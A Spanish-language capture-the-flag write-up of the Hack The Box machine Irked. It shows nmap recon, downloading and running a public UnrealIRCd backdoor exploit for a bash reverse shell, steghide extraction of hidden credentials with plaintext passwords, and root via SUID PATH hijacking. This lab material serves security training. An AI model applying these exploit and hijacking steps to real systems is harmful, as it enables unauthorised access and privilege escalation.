# Irked

![](../../../../~gitbook/image.md)Publicado: 25 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Irked es una máquina Linux de dificultad Easy que presenta múltiples vectores de ataque interesantes. La explotación inicial se basa en una backdoor conocida en UnrealIRCd 3.2.8.1, que permite la ejecución remota de comandos. Para obtener acceso al usuario, se requiere el uso de técnicas de esteganografía para extraer credenciales ocultas en una imagen. La escalada de privilegios se logra mediante la explotación de un binario personalizado con permisos SUID que puede ser manipulado a través de Path Hijacking.Esta máquina es excelente para practicar:- Enumeración de servicios IRC
- Explotación de backdoors conocidas
- Técnicas de esteganografía básica
- Escalada de privilegios mediante SUID y Path Hijacking
- Análisis de binarios con herramientas como `strings`

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios

###🌐 Enumeración Web

####80 HTTP
![](../../../../~gitbook/image.md)Realizamos fuzzing de directorios con feroxbuster pero no vemos mucho más que rascar aquí.
####6697 UnrealIRC
Buscamos sobre formas de enumerar este servicio y encontramos esta documentación de nmap:https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.htmlExiste un script de nmap para verificar si es una versión backdorizable de unrealircd![](../../../../~gitbook/image.md)Ejecutamos nmap con este script contra los puertos del servicio unrealircd:Nos confirma que parece que se trata de una versión troyanizada![](../../../../~gitbook/image.md)
###💻 Explotación
Buscamos un exploit y lo descargamosEditamos la ip y el puerto en el código del script para usar los de nuestro host de ataque:![](../../../../~gitbook/image.md)Ejecutamos el exploit y ganamos acceso al sistema:![](../../../../~gitbook/image.md)
####Mejora de la shell

####Initial foothold
Enumeramos los usuarios de la máquina y vemos que hay dos djmardov y ircdLa primera flag se encuentra en el usuario djmardov pero no tenemos permisos:![](../../../../~gitbook/image.md)En el directorio Documents del usuario djmardov encontramos un archivo oculto llamado backup que contiene una contraseña:![](../../../../~gitbook/image.md)Verificamos si el usuario djmardow está reutilizándola e intentamos autenticarnos con ella pero no funciona.Prestamos especial atención al mensaje junto a la contraseña "Super elite steg backup pw" podría dar a entender que se está usando steganografía, recordemos que vimos una imagen en el servicio del puerto 80:![](../../../../~gitbook/image.md)Vamos a descargarla y revisar con alguna herramienta como steghide si tiene algo oculto especificando la contraseña obtenida anteriormente:![](../../../../~gitbook/image.md)Parece que había un fichero oculto llamado pass.txt en la imagen con una contraseña:![[Pasted image 20250525135448.png]]![](../../../../~gitbook/image.md)Logramos autenticarnos con ella con el usuario djmardov y obtener la primera flag:
####👑 Escalada de privilegios
Buscamos archivos con permisos SUIDVemos uno poco común que merece la pena analizar:![](../../../../~gitbook/image.md)La ejecutamos y encontramos un banner donde se indica que la aplicación que se usa para establecer y ver permisos de usuario y que aún está en desarrollo. Dado que es un binario, probamos a usar strings para ver qué comandos se están usando:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)El bit SUID está configurado para este archivo. ¿Qué significa eso? Significa que se ejecutará con el nivel de privilegio que coincida con el usuario que posee este archivo. Dado que el archivo es propiedad de root, el archivo se ejecutará con privilegios de root.Vamos a crear un archivo en /tmp/listusers y hacemos que ejecuta una bash shell:![](../../../../~gitbook/image.md)Ya somos root y podemos obtener la flag.Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯ ping -c2 10.10.10.117
PING 10.10.10.117 (10.10.10.117) 56(84) bytes of data.
64 bytes from 10.10.10.117: icmp_seq=1 ttl=63 time=49.1 ms
64 bytes from 10.10.10.117: icmp_seq=2 ttl=63 time=47.3 ms

--- 10.10.10.117 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 47.264/48.179/49.095/0.915 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.143 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80,111,6697,8067,45980,65534
```

```
nmap -sC -sV -p$ports 10.10.10.117 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-25 13:25 CEST
Nmap scan report for 10.10.10.117
Host is up (0.046s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45980/tcp   status
|   100024  1          48376/udp   status
|   100024  1          49219/tcp6  status
|_  100024  1          58268/udp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
45980/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
ls -la /usr/share/nmap/scripts | grep unreal
```

```
❯ nmap --script=irc-unrealircd-backdoor -p6697,8067,45980,65534 10.10.10.117
```

```
wget https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/refs/heads/master/exploit.py
```

```
chmod +x exploit.py
```

```
python3 exploit.py 10.10.10.117 6697 -payload bash
```

```
script /dev/null -c bash
stty raw -echo; fg
reset xterm

export TERM=xterm
```

```
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
```

```
su djmardov
Kab6h+m+bbp2J:HG
```

```
find / -perm -4000 2>/dev/null
```

```
echo "bash" > /tmp/listusers
chmod +x listusers
/usr/bin/viewuser
```
